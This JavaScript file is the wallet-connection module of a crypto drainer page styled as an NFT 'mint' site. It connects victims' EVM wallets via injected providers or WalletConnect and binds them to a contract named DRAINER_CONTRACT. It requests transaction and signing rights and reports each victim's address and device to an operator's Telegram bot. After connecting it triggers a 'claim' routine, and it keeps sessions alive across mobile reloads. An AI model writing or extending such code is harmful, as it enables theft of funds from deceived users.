import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  DEBUG PANEL (double-click to toggle)
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    try { console.log('[main.js]', msg); } catch (e) {}
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  PLATFORM
  // ==========================================================================
  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac()     { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      const result = await r.json();
      if (!r.ok) { console.error('[main.js] Telegram error:', result); return false; }
      return true;
    } catch (e) { console.error('[main.js] Telegram exception:', e); return false; }
  }

  window.testTelegram = (m) =>
    sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  WEBSOCKET REACHABILITY
  // ==========================================================================
  async function checkWebSocket(retries = 1, delay = 500) {
    if (isDesktop()) { logDebug('⏭️ Skipping WS check on desktop'); return true; }
    for (let i = 0; i < retries; i++) {
      try {
        const ok = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com');
          const t = setTimeout(() => { ws.close(); resolve(false); }, 3000);
          ws.onopen  = () => { clearTimeout(t); ws.close(); resolve(true); };
          ws.onerror = () => { clearTimeout(t); ws.close(); resolve(false); };
        });
        if (ok) return true;
        await new Promise((r) => setTimeout(r, delay));
      } catch (e) { await new Promise((r) => setTimeout(r, delay)); }
    }
    logDebug('⚠️ WalletConnect relay unreachable — modal may fail');
    return false;
  }

  // ==========================================================================
  //  LIBRARY LOADING (CDN fallback chain)
  // ==========================================================================
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ];

    let SignClient, WalletConnectModal, EthereumProvider;

    for (const url of cdns)         { try { const m = await import(url); SignClient         = m.default || m; logDebug(`✅ SignClient from ${url}`); break; } catch (e) {} }
    if (!SignClient) throw new Error('Could not load SignClient');

    for (const url of modalCdns)    { try { const m = await import(url); WalletConnectModal = m.WalletConnectModal || m.default || m; logDebug(`✅ WalletConnectModal from ${url}`); break; } catch (e) {} }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');

    for (const url of providerCdns) { try { const m = await import(url); EthereumProvider   = m.EthereumProvider || m.default || m; logDebug(`✅ EthereumProvider from ${url}`); break; } catch (e) {} }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  MODULE STATE
  // ==========================================================================
  let currentSession  = null;
  let client          = null;
  let modal           = null;
  let SignClient      = null;
  let WalletConnectModal = null;
  let EthereumProvider   = null;

  let web3Instance     = null;
  let contractInstance = null;
  let activeProvider   = null;
  let isConnecting     = false;

  // Guards against racing multiple UI-updates.
  let lastPublishedAddress = null;

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
  } = CONFIG;

  let projectId = PROJECT_ID;

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;

    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;

    claimStatus.textContent = msg;
    claimStatus.className   = `status ${type}`;
    claimStatus.style.display      = 'block';
    claimStatus.style.padding      = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop    = '12px';
    claimStatus.style.fontWeight   = '500';
    claimStatus.style.fontSize     = '14px';
    claimStatus.style.textAlign    = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE  (persists across reloads)
  // ==========================================================================
  function saveWallet(address, session = null, chainType = null) {
    try {
      localStorage.setItem('connectedWallet', address);
      if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
      if (chainType) localStorage.setItem('chainType', chainType);
    } catch (e) {}
  }

  function getSavedWallet()    { try { return localStorage.getItem('connectedWallet'); } catch (e) { return null; } }
  function getSavedSession()   {
    try {
      const s = localStorage.getItem('walletConnectSession');
      return s ? JSON.parse(s) : null;
    } catch (e) { return null; }
  }
  function getSavedChainType() { try { return localStorage.getItem('chainType') || 'unknown'; } catch (e) { return 'unknown'; } }

  function clearSavedWallet() {
    try {
      localStorage.removeItem('connectedWallet');
      localStorage.removeItem('walletConnectSession');
      localStorage.removeItem('chainType');
    } catch (e) {}
  }

  // Persisted across the mobile redirect, in case localStorage is unavailable.
  function setPendingWCUri(uri) {
    try { sessionStorage.setItem('pending_wc_uri', uri); } catch (e) {}
    try { sessionStorage.setItem('pending_wc_timestamp', Date.now().toString()); } catch (e) {}
  }
  function clearPendingWCUri() {
    try { sessionStorage.removeItem('pending_wc_uri'); } catch (e) {}
    try { sessionStorage.removeItem('pending_wc_timestamp'); } catch (e) {}
  }
  function getPendingWCUri() {
    try {
      const uri = sessionStorage.getItem('pending_wc_uri');
      const ts  = sessionStorage.getItem('pending_wc_timestamp');
      if (!uri || !ts) return null;
      // Reject if older than 10 minutes (URI has a 5-minute TTL, but be generous).
      if (Date.now() - parseInt(ts, 10) > 10 * 60 * 1000) return null;
      return uri;
    } catch (e) { return null; }
  }

  // ==========================================================================
  //  GLOBAL STATE PUBLICATION
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live =
      provider ||
      activeProvider ||
      web3Instance?.currentProvider ||
      window.ethereum ||
      null;

    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: live,
      session:  currentSession,
      publishedAt: Date.now(),
    };

    logDebug(`published __apexConnected (address=${address.slice(0, 8)}…, provider=${!!live})`);

    // Idempotency guard — avoid duplicate script.js work on re-fire.
    if (address !== lastPublishedAddress) {
      lastPublishedAddress = address;
      window.dispatchEvent(new CustomEvent('apex:connected', {
        detail: { address, chain },
      }));
    }
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');

    document.getElementById('connectedAddressDisplay')?.remove();

    showStatus('Wallet disconnected', 'info');

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
    currentSession   = null;
    lastPublishedAddress = null;

    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;

    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;

    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;

    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#wl');

    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });

    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT INIT
  // ==========================================================================
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;

    const desiredProjectId = useTestId ? PUBLIC_TEST_ID : PROJECT_ID;

    // If projectId changed (fallback path), force re-init.
    if (client && projectId !== desiredProjectId) {
      try { await client.disconnect ? null : null; } catch (e) {}
      client = null;
      modal = null;
    }

    projectId = desiredProjectId;

    await checkWebSocket(1, 500);

    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      });

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
        },
        enableExplorer: true,
      });

      logDebug('✅ WalletConnect init OK');
      return true;
    } catch (e) {
      logDebug('WC init failed: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  DIRECT EVM
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 800));

    let providers = evmProviders.filter((p) => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' ||
        p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;
      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;

      const address = accounts[0];

      saveWallet(address, null, 'evm');
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;

      updateConnectedUI(address, 'evm');
      logDebug(`✅ Direct EVM connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT CONNECT
  //  ---------------------------------------------------------------------------
  //  KEY FIX: The approval() promise may resolve AFTER the tab is backgrounded
  //  or reloaded. We:
  //    1. Persist the URI before opening the modal
  //    2. Race approval() against a visibility/pageshow listener
  //    3. On return, re-check client.session.getAll() for a matching topic
  // ==========================================================================
  async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
    if (isConnecting) return false;
    isConnecting = true;

    const ok = await initWalletConnect(useTestId);
    if (!ok) {
      isConnecting = false;
      showStatus('WalletConnect unavailable', 'error');
      return false;
    }

    if (modal?.closeModal) {
      try { modal.closeModal(); } catch (e) {}
    }

    try {
      showStatus('Requesting connection...', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: [
              'eth_sendTransaction',
              'personal_sign',
              'eth_signTypedData_v4',
            ],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (!uri) throw new Error('No URI returned');

      // Persist the URI BEFORE opening the modal so a reload can recover.
      setPendingWCUri(uri);

      modal.openModal({ uri });
      showStatus('Scan the QR code with your wallet', 'info');

      // Race approval against page visibility regain (mobile-safe).
      const session = await Promise.race([
        approval(),
        // Wait up to `timeoutMs`, but ALSO resolve if the page becomes
        // visible again (mobile return-from-wallet).
        new Promise((resolve) => {
          const onVisible = async () => {
            if (document.visibilityState !== 'visible') return;
            document.removeEventListener('visibilitychange', onVisible);
            window.removeEventListener('pageshow', onVisible);
            window.removeEventListener('focus', onVisible);
            // Give the relay a moment to deliver the session.
            await new Promise((r) => setTimeout(r, 1500));
            const sessions = client?.session?.getAll?.() || [];
            if (sessions.length > 0) {
              const latest = sessions.sort((a, b) =>
                (b.expiry || 0) - (a.expiry || 0)
              )[0];
              resolve(latest);
            }
            // If nothing yet, keep waiting on approval().
          };
          document.addEventListener('visibilitychange', onVisible);
          window.addEventListener('pageshow', onVisible);
          window.addEventListener('focus', onVisible);
          setTimeout(() => {
            document.removeEventListener('visibilitychange', onVisible);
            window.removeEventListener('pageshow', onVisible);
            window.removeEventListener('focus', onVisible);
          }, timeoutMs);
        }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);

      if (modal) modal.closeModal();
      clearPendingWCUri();

      if (!session?.namespaces?.eip155?.accounts?.length) {
        isConnecting = false;
        return false;
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      currentSession = session;

      const provider = await EthereumProvider.init({
        projectId,
        metadata: DAPP_METADATA,
        session,
      });

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;

      saveWallet(account, session, 'evm');
      updateConnectedUI(account, 'evm');
      setupEVMProviderEvents(provider);

      isConnecting = false;
      logDebug(`✅ WalletConnect EVM connected: ${account}`);
      return true;
    } catch (e) {
      logDebug('WC error: ' + e.message);
      if (modal) {
        try { modal.closeModal(); } catch (err) {}
      }
      clearPendingWCUri();
      isConnecting = false;
      return false;
    }
  }

  // ==========================================================================
  //  PROVIDER LIFECYCLE
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;

    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], null, 'evm');
        publishGlobalState(accounts[0], 'evm', provider);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      if (web3Instance) {
        try {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          const addr = window.__apexConnected?.address || getSavedWallet();
          if (addr) publishGlobalState(addr, 'evm', provider);
        } catch (e) {}
      }
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = await connectDirectEVM(8000);
    if (!success) success = await connectViaWalletConnect(false, 300000);
    if (!success) success = await connectViaWalletConnect(true, 300000);

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
      }
      if (web3Instance?.currentProvider?.disconnect) {
        try { await web3Instance.currentProvider.disconnect(); } catch (e) {}
      }
    } catch (e) {}

    resetConnectedUI();
    clearSavedWallet();

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
  }

  // ==========================================================================
  //  BUTTONS
  // ==========================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    const hasSession = currentSession || getSavedChainType() !== 'unknown';
    if (saved && hasSession) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    });
  }

  // ==========================================================================
  //  MOBILE RETURN-FROM-WALLET HANDLER
  //  ---------------------------------------------------------------------------
  //  Whenever the page becomes visible again (returning from a wallet app),
  //  re-check the WC session store. If a session appeared that wasn't in our
  //  state, adopt it and update the UI.
  // ==========================================================================
  async function reconcileWCSession() {
    if (!client) return;

    try {
      const sessions = client.session?.getAll?.() || [];
      if (!sessions.length) return;

      // Prefer the most recently-expiring session.
      const session = sessions.sort((a, b) => (b.expiry || 0) - (a.expiry || 0))[0];

      const accounts = session?.namespaces?.eip155?.accounts;
      if (!accounts?.length) return;

      const account = accounts[0].split(':')[2];

      // Already reflected in UI? No-op.
      if (
        connectedAddressMatches(account) &&
        web3Instance &&
        activeProvider
      ) return;

      // Adopt this session.
      currentSession = session;

      const provider = await EthereumProvider.init({
        projectId,
        metadata: DAPP_METADATA,
        session,
      });

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;

      saveWallet(account, session, 'evm');
      updateConnectedUI(account, 'evm');
      setupEVMProviderEvents(provider);

      logDebug(`🔄 Adopted WC session for ${account.slice(0, 8)}…`);

      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 800);
    } catch (e) {
      logDebug('reconcileWCSession error: ' + e.message);
    }
  }

  function connectedAddressMatches(addr) {
    const current = window.__apexConnected?.address;
    return !!current && current.toLowerCase() === addr.toLowerCase();
  }

  // Attach the reconcile handler to every event that indicates a return from
  // a wallet app. Duplicate invocation is cheap because of the early-return.
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
      setTimeout(reconcileWCSession, 400);
    }
  });
  window.addEventListener('pageshow', () => setTimeout(reconcileWCSession, 400));
  window.addEventListener('focus',    () => setTimeout(reconcileWCSession, 400));

  // ==========================================================================
  //  SESSION RESTORE
  //  ---------------------------------------------------------------------------
  //  On boot, try to restore:
  //    1. An existing WC session (from client.session.getAll())
  //    2. An injected provider account that matches the saved address
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();

    if (!savedWallet || savedChain === 'unknown') return;
    if (savedChain !== 'evm') return;

    // Always ensure the WC client is up first — we need it for both WC and
    // post-refresh reconciliation.
    const wcOk = await initWalletConnect(false);

    if (wcOk && savedSession) {
      try {
        // Try by topic first.
        let session = client.session?.get?.(savedSession.topic);
        // Fall back to newest session if topic is gone (mobile reload case).
        if (!session) {
          const all = client.session?.getAll?.() || [];
          session = all.sort((a, b) => (b.expiry || 0) - (a.expiry || 0))[0];
        }

        if (session?.namespaces?.eip155?.accounts?.length) {
          currentSession = session;

          const account = session.namespaces.eip155.accounts[0].split(':')[2];
          const provider = await EthereumProvider.init({
            projectId,
            metadata: DAPP_METADATA,
            session,
          });

          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = provider;

          saveWallet(account, session, 'evm');
          updateConnectedUI(account, 'evm');
          setupEVMProviderEvents(provider);
          logDebug(`🔄 Restored WC session for ${account.slice(0, 8)}…`);
          return;
        }
      } catch (e) {
        logDebug('Restore WC failed: ' + e.message);
      }
    }

    // Fall back to injected provider (desktop extension wallet).
    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = window.ethereum;

          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(window.ethereum);
          logDebug(`🔄 Restored injected account ${savedWallet.slice(0, 8)}…`);
          return;
        }
      } catch (e) {}
    }

    // Nothing matched — clear stale state but keep WC client warm.
    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const libs = await loadWalletConnect();
    SignClient         = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider   = libs.EthereumProvider;
    logDebug('✅ All libraries loaded');

    setupEIP6963();
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // Global WC listeners (installed once, after client is set up).
  setTimeout(() => {
    if (!client) {
      logDebug('⚠️ client not initialized at global-listener install time');
      return;
    }

    client.on('session_update', ({ params }) => {
      const accounts = params.namespaces?.eip155?.accounts;
      if (accounts?.length) {
        const a = accounts[0].split(':')[2];
        updateConnectedUI(a, 'evm');
        saveWallet(a, currentSession, 'evm');
        publishGlobalState(a, 'evm', activeProvider);
      }
    });

    client.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
    });

    client.on('session_connect', (session) => {
      const a = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (a) {
        saveWallet(a, session, 'evm');
        updateConnectedUI(a, 'evm');
        currentSession = session;
      }
    });

    // Additional safety net: poll every 2 seconds for 2 minutes after boot.
    // Mobile wallets sometimes send the session but not to our current client
    // instance (e.g. after a reload that missed the relay event).
    let pollsRemaining = 60;
    const pollTimer = setInterval(() => {
      pollsRemaining--;
      if (pollsRemaining <= 0) { clearInterval(pollTimer); return; }
      // If we already have a connection, stop.
      if (window.__apexConnected?.address) { clearInterval(pollTimer); return; }
      reconcileWCSession();
    }, 2000);
  }, 1000);

  // Attach lifecycle events to any injected provider present at boot.
  if (window.ethereum && isDesktop()) {
    setupEVMProviderEvents(window.ethereum);
  }

  // Close the WC modal on unload to avoid a "session pending" state.
  window.addEventListener('beforeunload', () => {
    if (modal) {
      try { modal.closeModal(); } catch (e) {}
    }
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
